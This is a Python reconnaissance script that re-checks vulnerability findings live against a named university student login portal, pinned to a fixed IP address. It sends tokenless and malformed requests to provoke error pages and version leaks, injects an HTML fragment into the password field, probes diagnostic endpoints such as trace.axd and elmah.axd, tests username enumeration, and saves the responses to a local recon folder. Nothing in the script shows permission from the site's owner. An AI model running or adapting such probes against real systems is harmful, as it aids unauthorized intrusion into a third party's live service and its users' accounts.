#!/usr/bin/env python3
"""REAUDIT round 2026-08-25: re-probe every verified finding LIVE.
Second pass assumes the first was wrong; each check re-derives from raw
responses. Output: structured PASS/FAIL table; saves bodies to recon/reaudit/."""
import base64, os, re, socket, time, http.client, urllib.request, urllib.error

RESOLVED_IP = "98.70.14.50"

class PinnedHTTPSConnection(http.client.HTTPSConnection):
    def connect(self):
        self.sock = socket.create_connection((RESOLVED_IP, self.port), self.timeout)
        if self._tunnel_host:
            self._tunnel()
        self.sock = self._context.wrap_socket(self.sock, server_hostname=self.host)

class H(urllib.request.HTTPSHandler):
    def https_open(self, req):
        return self.do_open(PinnedHTTPSConnection, req)

class NR(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

urllib.request.install_opener(urllib.request.build_opener(H, NR))

T = "https://mujslcm.jaipur.manipal.edu"
OUT = os.path.expanduser("~/mujslcm-recon/recon/reaudit")
os.makedirs(OUT, exist_ok=True)
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 reaudit"

def get(path, extra_headers=None):
    req = urllib.request.Request(T + path, headers={"User-Agent": UA, **(extra_headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), (e.read() if e.fp else b"")

def post(path, data, extra_headers=None):
    req = urllib.request.Request(T + path, data=data.encode(),
                                 headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                                          **(extra_headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), (e.read() if e.fp else b"")

results = []
def rec(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"[{'PASS' if ok else 'FAIL'}] {name} {detail}")

# F1: POST without CSRF token -> 500 YSOD, HttpAntiForgeryException, build leak
st, h, b = post("/", "UserName=reaudit&Password=reaudit")
t = b.decode(errors="replace")
ysod = "HttpAntiForgeryException" in t or "System.Web.Mvc.HttpAntiForgeryException" in t
build = "4.7.4136.0" in t or "4.0.30319" in t
rec("F1 YSOD on tokenless POST (500 + anti-forgery + build)", st == 500 and ysod and build,
   f"st={st} bytes={len(b)} ysod={ysod} build={build}")
open(os.path.join(OUT, "f1-tokenless.html"), "wb").write(b)
time.sleep(1.5)

# F1b: enc=zz -> FormatException
st, h, b = get("/Home/Index?enc=zz")
rec("F1b enc=zz FormatException 500", st == 500 and "FormatException" in b.decode(errors="replace"),
   f"st={st} bytes={len(b)}")
time.sleep(1.5)

# F8: valid base64 enc -> CryptographicException
enc = base64.urlsafe_b64encode(b"\x01" * 48).rstrip(b"=").decode()
st, h, b = get(f"/Home/Index?enc={enc}")
rec("F8 enc valid-b64 CryptographicException 500", st == 500 and "CryptographicException" in b.decode(errors="replace"),
   f"st={st} bytes={len(b)}")
time.sleep(1.5)

# F6: password echo + sizes + F7 angle brackets
st, h, b = get("/")
tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', b.decode(errors="replace"))
tok = tok.group(1) if tok else ""
ck = h.get("Set-Cookie", "")
ckv = ck.split(";")[0].split("=", 1)[1] if "__RequestVerificationToken=" in ck else ""
rec("F6a token+cookie captured", bool(tok and ckv), "")
def try_pw(label, pw):
    data = f"UserName=reaudit&Password={urllib.request.quote(pw, safe='')}&EmailFor=student&LoginFor=Student&__RequestVerificationToken={tok}"
    st, h, b = post("/", data, {"Cookie": f"__RequestVerificationToken={ckv}"})
    tt = b.decode(errors="replace")
    m = re.search(r'id="txtPassword"[^>]*value="([^"]*)"', tt)
    echo = m.group(1) if m else ""
    return st, len(b), echo, tt
st8, l8, e8, _ = try_pw("pw8", "A" * 8)
time.sleep(1.5)
st300, l300, e300, _ = try_pw("pw300", "A" * 300)
rec("F6b size delta 292 (8 vs 300)", l300 - l8 == 292, f"l8={l8} l300={l300} delta={l300 - l8}")
rec("F6c password echoed into value (encoded)", e8 == "A" * 8 and e300 == "A" * 300, f"e8len={len(e8)} e300len={len(e300)}")
time.sleep(1.5)
st, l, e, _ = try_pw("angle", '"><b>x</b>')
rec("F7 angle brackets -> 500", st == 500, f"st={st}")
open(os.path.join(OUT, "f6-pw8.html"), "wb").write(b)
time.sleep(1.5)

# F9: cookie flags
st, h, b = get("/")
sc = h.get("Set-Cookie", "")
rec("F9 antiforgery cookie HttpOnly, no Secure", "HttpOnly" in sc and "Secure" not in sc,
   sc.split(";")[1:3] if sc else "NO COOKIE")
time.sleep(1.5)

# F10: trace/elmah + route discriminator
st, h, b = get("/trace.axd")
rec("F10a trace.axd 403", st == 403, f"st={st}")
time.sleep(1.0)
st, h, b = get("/elmah.axd")
rec("F10b elmah.axd 404", st == 404, f"st={st}")
time.sleep(1.0)
st, h, b = get("/Student/Index")
rec("F10c known route 302 (exists)", st == 302, f"st={st}")
time.sleep(1.0)
st, h, b = get("/zzz-nonexistent-abc")
rec("F10d junk route 404 (not exists)", st == 404, f"st={st}")
time.sleep(1.0)

# No-user-enum recheck (two different usernames, same session token)
st1, l1, e1, _ = try_pw("unameA", "Z" * 8)
st2, l2, e2, _ = try_pw("unameB", "Z" * 8)
rec("enum recheck: same size both usernames", l1 == l2, f"l1={l1} l2={l2}")

# headers audit
st, h, b = get("/")
hv = {k.lower(): v for k, v in h.items()}
rec("headers: IIS 10 + MVC 5.3 + XFO + x-powered-by",
   hv.get("server") == "Microsoft-IIS/10.0" and "5.3" in hv.get("x-aspnetmvc-version", "")
   and hv.get("x-frame-options") == "SAMEORIGIN" and "ASP.NET" in hv.get("x-powered-by", ""),
   str({k: hv.get(k) for k in ("server", "x-aspnetmvc-version", "x-frame-options", "x-powered-by")})[:120])

print(f"\n{'='*60}\n{sum(1 for _, ok, _ in results if ok)}/{len(results)} checks PASS")
sys_exit = 1 if any(not ok for _, ok, _ in results) else 0
raise SystemExit(sys_exit)